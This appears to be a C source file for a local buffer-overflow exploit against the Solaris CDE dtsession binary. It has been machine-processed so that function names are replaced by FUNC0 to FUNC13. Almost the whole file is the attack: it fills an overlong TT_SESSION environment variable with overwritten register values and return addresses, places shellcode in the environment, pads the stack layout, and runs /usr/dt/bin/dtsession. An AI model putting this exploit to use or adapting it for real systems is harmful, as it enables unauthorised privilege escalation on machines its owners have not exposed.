#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  unsigned long u_long ;

/* Variables and functions */
 int BUF_LEN ; 
 int /*<<< orphan*/  SI_PLATFORM ; 
 int /*<<< orphan*/  FUNC0 (char*,char**,char**) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 char* exploit ; 
 char* FUNC2 (char*) ; 
 int /*<<< orphan*/  got ; 
 char* FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int /*<<< orphan*/  FUNC6 (char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC7 (char*,char*) ; 
 int /*<<< orphan*/  FUNC8 (char*,char*) ; 
 char* FUNC9 (char*) ; 
 int FUNC10 (char*) ; 
 int /*<<< orphan*/  FUNC11 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ ,char*,int) ; 

FUNC13()
{
    char *argp[6], *envp[20];
    char buf[3072];
    char *ttsess;
    char *display;
    u_long *longp;
    char data[512];
    char padding[64];
    char platform[256];
    int pad=31;
    int i;

    FUNC4(buf,0,3072);
    FUNC4(buf,'a',BUF_LEN);

    longp = (unsigned long *)(buf+BUF_LEN);

    /* %l0 - %l7 */
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;

    /* %i0 - %i7 */
    *longp++ = 0xdeadcafe;
    *longp++ = 0xefffff94;      /* make sure %i1 can be used */
    *longp++ = 0xdeadcafe;
    *longp++ = got;             /* also used before we get to the exploit */
    *longp++ = 0xdeadcafe;
    *longp++ = 0xdeadcafe;
    *longp++ = 0xefffffb0;      /* frame with some necessary values */
    *longp++ = 0xeffffdd0;      /* return into the exploit code */


    longp=(unsigned long *)data;

    *longp++=0xdeadbeef;
    *longp++=0xdeadbeef;
    *longp++=0xdeadbeef;
    *longp++=0xdeadbeef;
    *longp++=0xdeadbeef;
    *longp++=0xffffffff;
    *longp++=0xdeadbeef;
    *longp++=0;
    *longp++=0xefffffb4;
    *longp++=0x01;
    *longp++=0xef6dc154;
    *longp++=0xeffffd26;
    *longp++=0x00;

    argp[0] = FUNC9("/usr/dt/bin/dtsession");
    argp[1] = NULL;

    if (!FUNC2("DISPLAY")) {
        FUNC5("forgot to set DISPLAY\n");
        FUNC1(1);
    }

    FUNC12(SI_PLATFORM,platform,256);
    pad+=20-FUNC10(platform)-FUNC10(argp[0]);

    for (i=0;i<pad;padding[i++]='C')
        padding[i]=0;

    /* create an enviroment size independent of the size of $DISPLAY */
    display = FUNC3( 8 + FUNC10(FUNC2("DISPLAY")) + 1);
    FUNC8(display,"DISPLAY=");
    FUNC7(display+8,FUNC2("DISPLAY"));
    envp[0] = display;
    envp[1] = FUNC3(60);
    FUNC4(envp[1], 0, 60);
    FUNC4(envp[1], 'a', 60 - FUNC10(envp[0]));
    FUNC11(envp[1],"W=",2);

    /* put the exploit code in the env space (easy to locate) */
    envp[2] = FUNC9(exploit);

    /* create the overflow string */
    ttsess = FUNC9("TT_SESSION=01 18176 1289637086 1 0 1000 %s 4");
    envp[3] = FUNC3( FUNC10(ttsess) + FUNC10(buf));
    FUNC6(envp[3],ttsess,buf);

    /* make it easier to debug, probably smarter ways to do this */
    envp[4] = FUNC9("LD_BIND_NOW=1   ");

    /* put some data in the environment to keep the code running after the
       overflow, but before the return pointer is used. includes NULL ptrs */
    envp[5]=(data);
    envp[6]="";
    envp[7]="";
    envp[8]="";
    envp[9]=&(data[32]);
    envp[10]="";
    envp[11]="";
    envp[12]=&(data[39]);
    envp[13]="";
    envp[14]="";
    envp[15]="\010";
    envp[16]=padding;
    envp[17]=NULL;

    FUNC0("/usr/dt/bin/dtsession",argp,envp);

}